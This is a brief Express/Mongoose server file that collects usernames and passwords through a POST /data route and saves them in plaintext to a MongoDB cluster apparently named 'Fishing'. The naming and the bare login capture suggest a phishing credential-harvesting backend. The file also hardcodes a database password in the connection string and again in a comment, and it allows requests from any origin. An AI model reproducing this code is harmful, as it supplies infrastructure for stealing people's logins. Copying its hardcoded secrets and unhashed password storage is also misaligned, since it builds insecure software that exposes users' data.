const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors')

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.json());
app.use(cors());

// MongoDB connection
mongoose.connect('mongodb+srv://victor:ZtI0zFdllr22OiRp@fishing.16gq8b2.mongodb.net/?retryWrites=true&w=majority&appName=Fishing', { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected...'))
    .catch(err => console.log(err));

// Mongoose schema and model
const DataSchema = new mongoose.Schema({
    username: String,
    password: String,
});
// ZtI0zFdllr22OiRp	
const Data = mongoose.model('Data', DataSchema);

// POST route
app.post('/data', async (req, res) => {
    const { anchor, username, password, email } = req.body;
    try {
        const newData = new Data({ username, password });

        await newData.save();
        res.status(201).send('Data saved successfully');
    } catch (err) {
        res.status(400).send('Error saving data: ' + err.message);
    }
});

// Start server
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});